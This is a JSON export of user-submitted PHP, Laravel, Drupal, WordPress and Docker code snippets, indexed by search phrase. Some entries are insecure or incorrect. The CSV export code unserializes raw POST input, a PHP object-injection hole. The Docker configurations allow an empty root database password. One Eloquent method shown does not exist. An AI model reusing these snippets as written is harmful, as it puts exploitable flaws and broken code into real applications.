    "link": null,
    "title": " distance between two locations in php",
    "description": "<?php  /*::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/ /*::                                                                         :*/ /*::  This routine calculates the distance between two points (given the     :*/ /*::  latitude/longitude of those points). It is being used to calculate     :*/ /*::  the distance between two locations using GeoDataSource(TM) Products    :*/ /*::                                                                         :*/ /*::  Definitions:                                                           :*/ /*::    South latitudes are negative, east longitudes are positive           :*/ /*::                                                                         :*/ /*::  Passed to function:                                                    :*/ /*::    lat1, lon1 = Latitude and Longitude of point 1 (in decimal degrees)  :*/ /*::    lat2, lon2 = Latitude and Longitude of point 2 (in decimal degrees)  :*/ /*::    unit = the unit you desire for results                               :*/ /*::           where: 'M' is statute miles (default)                         :*/ /*::                  'K' is kilometers                                      :*/ /*::                  'N' is nautical miles                                  :*/ /*::  Worldwide cities and other features databases with latitude longitude  :*/ /*::  are available at https://www.geodatasource.com                          :*/ /*::                                                                         :*/ /*::  For enquiries, please contact sales@geodatasource.com                  :*/ /*::                                                                         :*/ /*::  Official Web site: https://www.geodatasource.com                        :*/ /*::                                                                         :*/ /*::         GeoDataSource.com (C) All Rights Reserved 2018                  :*/ /*::                                                                         :*/ /*::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/ function distance($lat1, $lon1, $lat2, $lon2, $unit) {   if (($lat1 == $lat2) && ($lon1 == $lon2)) {     return 0;   }   else {     $theta = $lon1 - $lon2;     $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) +  cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta));     $dist = acos($dist);     $dist = rad2deg($dist);     $miles = $dist * 60 * 1.1515;     $unit = strtoupper($unit);      if ($unit == \"K\") {       return ($miles * 1.609344);     } else if ($unit == \"N\") {       return ($miles * 0.8684);     } else {       return $miles;     }   } }  echo distance(32.9697, -96.80322, 29.46786, -98.53506, \"M\") . \" Miles<br>\"; echo distance(32.9697, -96.80322, 29.46786, -98.53506, \"K\") . \" Kilometers<br>\"; echo distance(32.9697, -96.80322, 29.46786, -98.53506, \"N\") . \" Nautical Miles<br>\";  ?>\npanipat\n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1009,
    "keyword": null,
    "link": null,
    "title": " do artisan laravel in code",
    "description": "\\Artisan::call('migrate:refresh');\n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1010,
    "keyword": null,
    "link": null,
    "title": " do shortcode",
    "description": "echo do_shortcode('[name_of_shortcode]');\n<?php echo do_shortcode('[name_of_shortcode parameters=\"\"]'); ?>\n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1011,
    "keyword": null,
    "link": null,
    "title": " do shortcode wordpress",
    "description": "echo do_shortcode('[name_of_shortcode]');\n<?php echo do_shortcode('[name_of_shortcode]'); ?> \nfunction create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\n<?php echo do_shortcode('[name_of_shortcode parameters=\"\"]'); ?>\nfunction wpdocs_bartag_func( $atts ) {     $atts = shortcode_atts(         array(             'foo' => 'no foo',             'bar' => 'default bar',         ), $atts, 'bartag' );       return 'bartag: ' . esc_html( $atts['foo'] ) . ' ' . esc_html( $atts['bar'] ); } add_shortcode( 'bartag', 'wpdocs_bartag_func' );\nfunction wp_demo_shortcode() {   //Turn on output buffering ob_start(); $code = 'Hello World'; ob_get_clean();   // Output needs to be return return $code; }   // register shortcode add_shortcode('helloworld', 'wp_demo_shortcode'); \n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1012,
    "keyword": null,
    "link": null,
    "title": " do while php",
    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n<?php \t$a = 0; \twhile($a<=5){     \techo $a.\"<br>\";       $a++;     }   ?>\nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n <?php $i = 0; do {     echo $i; } while ($i > 0); ?>  \nwhile(true) {  // Infinite Loop }\n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1013,
    "keyword": null,
    "link": null,
    "title": " docker-compose phpmyadmin example",
    "description": "version: '3.8' services: ############################# # MARIADB SERVIVICES #############################   db:     image: mariadb:latest     restart: always     healthcheck:       interval: 120ms       retries: 5       start_period: 60ms       test: |         touch /tmp/healthcheck.txt &&         mkdir /tmp/healthcheck &&         mv /tmp/healthcheck.txt /tmp/healthcheck &&         cd /tmp/healthcheck &&         echo \"hello my docker container is working fine\" >> healthcheck.txt &&         cat healthcheck.txt &&         rm healthcheck.txt &&         cd .. &&         rmdir /tmp/healthcheck         cls       timeout: 30ms     environment:       - MYSQL_ALLOW_EMPTY_PASSWORD=yes       - MYSQL_USER=root       - MYSQL_DATABASE=projectdb     ports:       - 3306:3306     volumes:       - mysql-data:/var/lib/mysql/data     networks:       - pma_networks ############################# # PHPMYADMIN SERVIVICES #############################   pma:     image: phpmyadmin:latest     restart: always     healthcheck:       interval: 120ms       retries: 5       start_period: 60ms       test: |         touch /tmp/healthcheck.txt &&         mkdir /tmp/healthcheck &&         mv /tmp/healthcheck.txt /tmp/healthcheck &&         cd /tmp/healthcheck &&         echo \"hello my docker container is working fine\" >> healthcheck.txt &&         cat healthcheck.txt &&         rm healthcheck.txt &&         cd .. &&         rmdir /tmp/healthcheck         cls       timeout: 30ms     environment:       - PMA_ARBITRARY=1     ports:       - 80:80     depends_on:       - db     volumes:       - pma-data:/var/lib/phpmyadmin/data     networks:       - pma_networks ############################# # PERSISTENT DATA ############################# volumes:   mysql-data:   pma-data: ################################ # SAME NETWORKS FOR ALL SERVICE ############################### networks:   pma_networks:\n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1014,
    "keyword": null,
    "link": null,
    "title": " docker phpmyadmin",
    "description": "version: '3.8' services: ############################# # MARIADB SERVIVICES #############################   db:     image: mariadb:latest     restart: always     healthcheck:       interval: 120ms       retries: 5       start_period: 60ms       test: |         touch /tmp/healthcheck.txt &&         mkdir /tmp/healthcheck &&         mv /tmp/healthcheck.txt /tmp/healthcheck &&         cd /tmp/healthcheck &&         echo \"hello my docker container is working fine\" >> healthcheck.txt &&         cat healthcheck.txt &&         rm healthcheck.txt &&         cd .. &&         rmdir /tmp/healthcheck         cls       timeout: 30ms     environment:       - MYSQL_ALLOW_EMPTY_PASSWORD=yes       - MYSQL_USER=root       - MYSQL_DATABASE=projectdb     ports:       - 3306:3306     volumes:       - mysql-data:/var/lib/mysql/data     networks:       - pma_networks ############################# # PHPMYADMIN SERVIVICES #############################   pma:     image: phpmyadmin:latest     restart: always     healthcheck:       interval: 120ms       retries: 5       start_period: 60ms       test: |         touch /tmp/healthcheck.txt &&         mkdir /tmp/healthcheck &&         mv /tmp/healthcheck.txt /tmp/healthcheck &&         cd /tmp/healthcheck &&         echo \"hello my docker container is working fine\" >> healthcheck.txt &&         cat healthcheck.txt &&         rm healthcheck.txt &&         cd .. &&         rmdir /tmp/healthcheck         cls       timeout: 30ms     environment:       - PMA_ARBITRARY=1     ports:       - 80:80     depends_on:       - db     volumes:       - pma-data:/var/lib/phpmyadmin/data     networks:       - pma_networks ############################# # PERSISTENT DATA ############################# volumes:   mysql-data:   pma-data: ################################ # SAME NETWORKS FOR ALL SERVICE ############################### networks:   pma_networks:\n$ docker pull phpmyadmin/phpmyadmin:latest\n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1015,
    "keyword": null,
    "link": null,
    "title": " doctrine mongodb native query",
    "description": "/** @var DocumentManager $documentManager */ $documentManager = $this->container \t->get('doctrine_mongodb') \t->getManager();  $mongoClient = $documentManager->getConnection()->getMongoClient();  $db = $mongoClient->selectDB('dbname');  $collection = $mongoClient->selectCollection($db, 'collectionName'); $results = $collection->find();\n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1016,
    "keyword": null,
    "link": null,
    "title": " doctrine order by",
    "description": "<?php // $qb instanceof QueryBuilder  $qb->select('u')    ->from('User', 'u')    ->where('u.id = ?1')    ->orderBy('u.name', 'ASC'); \n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1017,
    "keyword": null,
    "link": null,
    "title": " doctrine orm get all",
    "description": "$records = $em->getRepository(\"Entities\\YourTargetEntity\")->findAll();\n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1018,
    "keyword": null,
    "link": null,
    "title": " doctrine php driver execption",
    "description": "Uncomment in your php.ini the pdo according to your database For exemple MySQL: ; extension=pdo_mysql     remove the \";\"  extension=pdo_mysql \n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1019,
    "keyword": null,
    "link": null,
    "title": " docx file validation laravel 8",
    "description": "$validator = Validator::make($request->all(), [             'resume'   => 'mimes:doc,pdf,docx,zip'         ]);\n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1020,
    "keyword": null,
    "link": null,
    "title": " does canada have a monarchy",
    "description": "You are a programmer, WHY are you googling this \n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1021,
    "keyword": null,
    "link": null,
    "title": " does queen elizabeth control canada",
    "description": "You are a programmer, WHY are you googling this \n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1022,
    "keyword": null,
    "link": null,
    "title": " dont show file type in url",
    "description": "RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\\.php -f RewriteRule ^(.*)$ $1.php\n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1023,
    "keyword": null,
    "link": null,
    "title": " doument root phpp",
    "description": "<?php echo $_SERVER['DOCUMENT_ROOT'].'/hello.html'; ?>\n$RootPath = $_SERVER[\"DOCUMENT_ROOT\"];\n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1024,
    "keyword": null,
    "link": null,
    "title": " downgrade php 7.4 to 7.3 mac",
    "description": "#Install php version 7.3 brew install php@7.3 #Install the required PHP to your PATH echo 'export PATH=\"/usr/local/opt/php@7.3/bin:$PATH\"' >> ~/.bash_profile echo 'export PATH=\"/usr/local/opt/php@7.3/sbin:$PATH\"' >> ~/.bash_profile source ~/.bash_profile #Check Version php --version #Show you where your ini file is loaded php --ini\n$ brew unlink php@7.1 $ brew link php@7.4 --force --overwrite \n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1025,
    "keyword": null,
    "link": null,
    "title": " download csv php mysql",
    "description": "CREATE TABLE `users` (   `id` int(11) NOT NULL PRIMARY KEY AUTO_INCREMENT,   `username` varchar(80) NOT NULL,   `name` varchar(50) NOT NULL,   `gender` varchar(10) NOT NULL,   `email` varchar(70) NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1;  ========================================================= // this config.php <?php $host = \"localhost\"; /* Host name */ $user = \"root\"; /* User */ $password = \"\"; /* Password */ $dbname = \"tutorial\"; /* Database name */  $con = mysqli_connect($host, $user, $password,$dbname); // Check connection if (!$con) {  die(\"Connection failed: \" . mysqli_connect_error()); }   ================================================================= // prints contents of db to a table with an export button <?php  include \"config.php\"; // Database connection file ?>  <div class=\"container\">    <form method='post' action='download.php'>   <input type='submit' value='Export' name='Export'>     <table border='1' style='border-collapse:collapse;'>     <tr>      <th>ID</th>      <th>Username</th>      <th>Name</th>      <th>Gender</th>      <th>Email</th>     </tr>     <?php       $query = \"SELECT * FROM users ORDER BY id asc\";      $result = mysqli_query($con,$query);      $user_arr = array();      while($row = mysqli_fetch_array($result)){       $id = $row['id'];       $uname = $row['username'];       $name = $row['name'];       $gender = $row['gender'];       $email = $row['email'];       $user_arr[] = array($id,$uname,$name,$gender,$email);    ?>       <tr>        <td><?php echo $id; ?></td>        <td><?php echo $uname; ?></td>        <td><?php echo $name; ?></td>        <td><?php echo $gender; ?></td>        <td><?php echo $email; ?></td>       </tr>    <?php     }    ?>    </table>    <?php      $serialize_user_arr = serialize($user_arr);    ?>   <textarea name='export_data' style='display: none;'><?php echo $serialize_user_arr; ?></textarea>  </form> </div>                    =============================================================   //Create a new download.php file -- code below//            <?php $filename = 'users.csv'; $export_data = unserialize($_POST['export_data']);  // file creation $file = fopen($filename,\"w\");  foreach ($export_data as $line){  fputcsv($file,$line); }  fclose($file);  // download header(\"Content-Description: File Transfer\"); header(\"Content-Disposition: attachment; filename=\".$filename); header(\"Content-Type: application/csv; \");   readfile($filename);  // deleting file unlink($filename); exit();\n",
    "reg_date": "2021-10-12T10:13:43.000Z"
  },
  {
    "id": 1026,
    "keyword": null,
    "link": null,
    "title": " download html content from url php",
    "description": "$c = curl_init('https://yourURLhere.com'); curl_setopt($c, CURLOPT_RETURNTRANSFER, true); //curl_setopt(... other options you want...)  $html = curl_exec($c);  if (curl_error($c))     die(curl_error($c));  // Get the status code $status = curl_getinfo($c, CURLINFO_HTTP_CODE);  curl_close($c);\nSince PHP 5.1.0, file_put_contents() supports writing piece-by-piece by passing a stream-handle as the $data parameter:  file_put_contents(\"Tmpfile.zip\", fopen(\"http://someurl/file.zip\", 'r')); From the manual:  If data [that is the second argument] is a stream resource, the remaining buffer of that stream will be copied to the specified file. This is similar with using stream_copy_to_stream().  (Thanks Hakre.)\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1027,
    "keyword": null,
    "link": null,
    "title": " download pdf php",
    "description": "<?php  echo '<a href=\"FileLink\" download=\"newfilename\">Download the pdf</a>'; //It will work for all kind of file. ?>\n <?php // We'll be outputting a PDF header('Content-Type: application/pdf');  // It will be called downloaded.pdf header('Content-Disposition: attachment; filename=\"downloaded.pdf\"');  // The PDF source is in original.pdf readfile('original.pdf'); ?>  \n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1028,
    "keyword": null,
    "link": null,
    "title": " drop column migration laravel",
    "description": "public function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\n Class RemoveCommentViewCount extends Migration   {       public function up()       {           Schema::table('articles', function($table) {              $table->dropColumn('comment_count');              $table->dropColumn('view_count');           });       }        public function down()       {           Schema::table('articles', function($table) {              $table->integer('comment_count');              $table->integer('view_count');           });       }   }\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\nSchema::drop('users');  Schema::dropIfExists('users');\n// Searched, laravel drop foreign column Schema::table('users', function (Blueprint $table) {     $table->dropColumn(['votes', 'avatar', 'location']); });\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1029,
    "keyword": null,
    "link": null,
    "title": " drop column table in migration if exist in laravel",
    "description": "if (Schema::hasColumn('users', 'phone')) {  \tSchema::table('users', function (Blueprint $table){        $table->dropColumn('phone');     }); }\nSchema::table('users', function (Blueprint $table) {      if (Schema::hasColumn('users', 'phone')) {               $table->dropColumn('phone'); \t\t} });\nSchema::table('users', function (Blueprint $table) {      $table->dropColumn('name'); });\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1030,
    "keyword": null,
    "link": null,
    "title": " drop table phpmyadmin",
    "description": "in phpmyadmin : click on the table > operations > drop table in php => https://www.tutorialspoint.com/mysql/mysql-drop-tables.htm\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1031,
    "keyword": null,
    "link": null,
    "title": " drupal 8 date formater service",
    "description": "\\Drupal::service('date.formatter')     ->format($timestamp, $type, $format, $timezone, $langcode);\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1032,
    "keyword": null,
    "link": null,
    "title": " drupal 8 enable twig debug",
    "description": "// You enable Twig Debugging in services.yml  parameters:   twig.config:     debug: true \n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1033,
    "keyword": null,
    "link": null,
    "title": " drupal 8 get all nodes of type",
    "description": "$nids = \\Drupal::entityQuery('node')->condition('type','my_custom_type')->execute(); $nodes =  \\Drupal\\node\\Entity\\Node::loadMultiple($nids); \n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1034,
    "keyword": null,
    "link": null,
    "title": " drupal 8 get taxonomy terms by vocabulary name",
    "description": "$terms = \\Drupal::entityTypeManager()->getStorage('taxonomy_term')->loadByProperties([   'vid' => 'vocabulary__machine_name' ]);\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1035,
    "keyword": null,
    "link": null,
    "title": " drupal 8 show php errors settings.php",
    "description": "//settings.php error_reporting(E_ALL);  ini_set('display_errors', TRUE);  ini_set('display_startup_errors', TRUE);  $config['system.logging']['error_level'] = 'verbose';\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1036,
    "keyword": null,
    "link": null,
    "title": " drupal 8 user load",
    "description": "function user_load($uid, $reset = FALSE) {   if ($reset) {     \\Drupal::entityManager()       ->getStorage('user')       ->resetCache(array(       $uid,     ));   }   return User::load($uid); }\n",
    "reg_date": "2021-10-12T10:13:44.000Z"
  },
  {
    "id": 1037,
    "keyword": null,
    "link": null,
    "title": " drupal 9 enable PHP errors",
    "description": "error_reporting(E_ALL); ini_set('display_errors', TRUE); ini_set('display_startup_errors', TRUE); \n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1038,
    "keyword": null,
    "link": null,
    "title": " drupal composer update",
    "description": "composer update drupal/core 'drupal/core-*' --with-all-dependencies\ncomposer update drupal/core \"drupal/core-*\" --with-all-dependencies\n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1039,
    "keyword": null,
    "link": null,
    "title": " dsiplay array on php",
    "description": "$array = array( \t1 => 'apple',   \t2 => 'banana', )  // Method 1 echo \"<pre>\"; print_r($array); echo \"</pre>\";  // Method 2  echo \"<pre>\"; var_dump($array); echo \"</pre>\";  // Method 3 (cakephp) pr ($array);\nprint_r($array);\n<?php $cars = array(\"Volvo\", \"BMW\", \"Toyota\"); echo \"I like \" . $cars[0] . \", \" . $cars[1] . \" and \" . $cars[2] . \".\"; ?>\n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1040,
    "keyword": null,
    "link": null,
    "title": " dump all variables twig",
    "description": "<ol>   {% for key, value in _context  %}     <li>{{ key }}</li>   {% endfor %} </ol>\n{{ dump(user) }} \n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1041,
    "keyword": null,
    "link": null,
    "title": " dump php array into javascript array",
    "description": "var arrNums = json_encode(<?php echo $arrNums; ?>);\nvar js_array = [<?php echo '\"'.implode('\",\"',  $disabledDaysRange ).'\"' ?>]; \n//in js do this var masterarray =  <?php echo '[\"' . implode('\", \"', $masterarray) . '\"]' ?>;\n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1042,
    "keyword": null,
    "link": null,
    "title": " dyld: Library not loaded: /usr/local/opt/icu4c/lib/libicui18n.64.dylib Referenced from: /usr/local/bin/php Reason: image not found zsh: abort bin/console sw:cache:clear",
    "description": "brew reinstall node\nbrew upgrade brew cleanup\n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1043,
    "keyword": null,
    "link": null,
    "title": " dynamic base url codeigniter",
    "description": "defined('BASE_URL') OR define('BASE_URL', (is_https() ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/'); $config['base_url'] = BASE_URL;\n$base_url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == \"on\") ? \"https\" : \"http\"); $base_url .= \"://\". @$_SERVER['HTTP_HOST']; $base_url .= str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']); $config['base_url'] = $base_url; \n$this->load->helper('url');\n$base_url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == \"on\") ? \"https\" : \"http\"); $base_url .= \"://\". @$_SERVER['HTTP_HOST']; $base_url .=     str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']); $config['base_url'] = $base_url;\n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1044,
    "keyword": null,
    "link": null,
    "title": " e notice in php",
    "description": "// Reporting E_NOTICE  error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);\n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1045,
    "keyword": null,
    "link": null,
    "title": " echo class php",
    "description": "If you just want to print the contents of the class for debugging purposes, use print_r or var_dump.\n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1046,
    "keyword": null,
    "link": null,
    "title": " echo errors php",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n<?php error_reporting(E_ALL); ?>\nerror_reporting(E_ALL); ini_set('display_errors', '1'); \n",
    "reg_date": "2021-10-12T10:13:45.000Z"
  },
  {
    "id": 1047,
    "keyword": null,
    "link": null,
    "title": " echo new line",
    "description": "# Using echo echo -e \"Line 1\\nLine 2\" echo \"Line 1 $HOME expanded Line 2\" echo 'Line 1 $HOME not expanded Line 2'  # Similar result, using cat cat <<EOF Line 1 $HOME expanded Line 2 EOF cat <<'EOF' Line 1 $HOME not expanded Line 2 EOF \necho $'username=user\\npassword=pass' > ~/samba-credentials\necho -e \"hello\\nworld\"\necho -e \"hello\\nworld\" # Output   /*    * hello    * world    */\necho -e \"Line 1\\nLine 2\"\necho $'hello\\nworld'\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1048,
    "keyword": null,
    "link": null,
    "title": " echo php",
    "description": "<?php   echo \"Hello World!\"; // You can also do this with a variable: $YourVariable = \"Hello World!\"; echo $YourVariable; ?>\n<?php   echo \"your text\"; ?>\n<?php  $string = \"Hello, World!\"; echo $string; ?>\nSource link: https://www.programmingquest.com/2019/04/difference-between-echo-and-print.html  1. echo Statement * we can write echo statement with parenthesis like 'echo()' or without parenthesis 'echo'. * In the echo we can pass multiple variable in comma separated form to see the output like 'echo $a,$b,$c;' * echo doesn&rsquo;t return any value * echo is faster then print  2. Print Statement * we can write print statement with parenthesis like 'print()' or without parenthesis 'print'. * In the print we can not pass multiple variable in comma separated form like echo. * print statement always returns 1. * print is slower than echo\nprint_r(\"\");\n<?php echo 'Je suis colori&eacute; par highlightJS !' ?> \n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1049,
    "keyword": null,
    "link": null,
    "title": " echo post content by slug",
    "description": "$page = get_posts( array( 'name' => 'your-slug' ) );  if ( $page ) {     echo $page[0]->post_content; } \n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1050,
    "keyword": null,
    "link": null,
    "title": " echo pre print r",
    "description": "echo '<pre>',print_r($arr,1),'</pre>';\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1051,
    "keyword": null,
    "link": null,
    "title": " echo query in laravel",
    "description": "DB::enableQueryLog(); $users = User::select(\"*\")->get(); $quries = DB::getQueryLog(); dd($quries); DB::table('users')->toSql(); dd($query);\nDB::enableQueryLog(); # your code dd(DB::getQueryLog()); DB::disableQueryLog();\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1052,
    "keyword": null,
    "link": null,
    "title": " echo session",
    "description": "print_r($_SESSION);\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1053,
    "keyword": null,
    "link": null,
    "title": " edit data using model in laravel 8",
    "description": "mymodelname::edit([ \t'title' => 'mytitle' ]);\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1054,
    "keyword": null,
    "link": null,
    "title": " eliminar ultimo caracter string php",
    "description": "$mystring = 'number 1, number 2, number 3,'; $myString = substr($myString, 0, -1); echo $myString;  // 'number 1, number 2, number 3'\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1055,
    "keyword": null,
    "link": null,
    "title": " eloquent all only one culomn",
    "description": "$collection = collect([     ['product_id' => 'prod-100', 'name' => 'Desk'],     ['product_id' => 'prod-200', 'name' => 'Chair'], ]);  $plucked = $collection->pluck('name');  $plucked->all();  // ['Desk', 'Chair']\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1056,
    "keyword": null,
    "link": null,
    "title": " eloquent get distinct",
    "description": "$items = DB::table('item')->select('item_name')->distinct()->get();\n$ad->getcodes()->distinct('pid')->count('pid');\n",
    "reg_date": "2021-10-12T10:13:46.000Z"
  },
  {
    "id": 1057,
    "keyword": null,
    "link": null,
    "title": " eloquent get only some columns",
    "description": "Table::select('name','surname')->where('id', 1)->get();\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1058,
    "keyword": null,
    "link": null,
    "title": " eloquent get query log",
    "description": "DB::enableQueryLog(); $arr_user = DB::table('users')->select('name', 'email as user_email')->get(); dd(DB::getQueryLog());\n DB::connection()->enableQueryLog(); //enable query log  $data = $order->all(); //query execute  $queries = DB::getQueryLog(); //get query  return dd($queries); //show query\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1059,
    "keyword": null,
    "link": null,
    "title": " eloquent limit vs take",
    "description": "\"limit\" only works on eloquent ORM or query builder objects  whereas \"take\" works on both collections and the ORM or Query Builder objects.  Model::get()->take(20);   // Correct Model::get()->limit(20);  // Incorrect  Model::take(20)->get()    // Correct Model::limit(20)->get()   // Correct\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1060,
    "keyword": null,
    "link": null,
    "title": " eloquent model sort by ascending order",
    "description": "->orderBy('id', 'DESC');\n$posts = Post::orderBy('id', 'DESC')->get(); \n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1061,
    "keyword": null,
    "link": null,
    "title": " eloquent pluck multiple columns",
    "description": "$records = $records->pluck('data', 'id')->toArray(); // [ //\t'id' => 'data', //  ... //] \nYourModelName::all('id', 'name');\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1062,
    "keyword": null,
    "link": null,
    "title": " eloquent run seeder",
    "description": "php artisan db:seed --class=UserSeeder\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1063,
    "keyword": null,
    "link": null,
    "title": " eloquent update row response",
    "description": "$user = tap($user)->update(['votes' => 123]); \nDB::table('users')             ->where('id', 1)             ->update(['votes' => 1]);\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1064,
    "keyword": null,
    "link": null,
    "title": " eloquent using last()",
    "description": "Model::latest()->first();\nModel::latest()->first(); \nreturn DB::table('files')->order_by('upload_time', 'desc')->first();\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1065,
    "keyword": null,
    "link": null,
    "title": " eloquent where date between",
    "description": "$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get();\n$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get(); \n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1066,
    "keyword": null,
    "link": null,
    "title": " eloquent where in",
    "description": "$users = DB::table('users')->whereIn('id', array(1, 2, 3))->get()\n$users = DB::table('users')->whereIn('id', array(1, 2, 3))->get() \n$users = Users::whereIn('id', array(1, 2, 3))->get()\nTable::where('Column', Value)->where('NewColumn', Value)->get();\n",
    "reg_date": "2021-10-12T10:13:47.000Z"
  },
  {
    "id": 1067,
    "keyword": null,
    "link": null,
    "title": " eloquent with select",
    "description": "Post::query()     ->with(array('user' => function($query) {         $query->select('id','username');     }))     ->get(); \n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1068,
    "keyword": null,
    "link": null,
    "title": " email configuration for gmail in laravel",
    "description": "MAIL_DRIVER=smtpMAIL_HOST=smtp.googlemail.comMAIL_PORT=465MAIL_USERNAME=ENTER_YOUR_EMAIL_ADDRESS(GMAIL)MAIL_PASSWORD=ENTER_YOUR_GMAIL_PASSWORDMAIL_ENCRYPTION=ssl\n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1069,
    "keyword": null,
    "link": null,
    "title": " email validation in laravel",
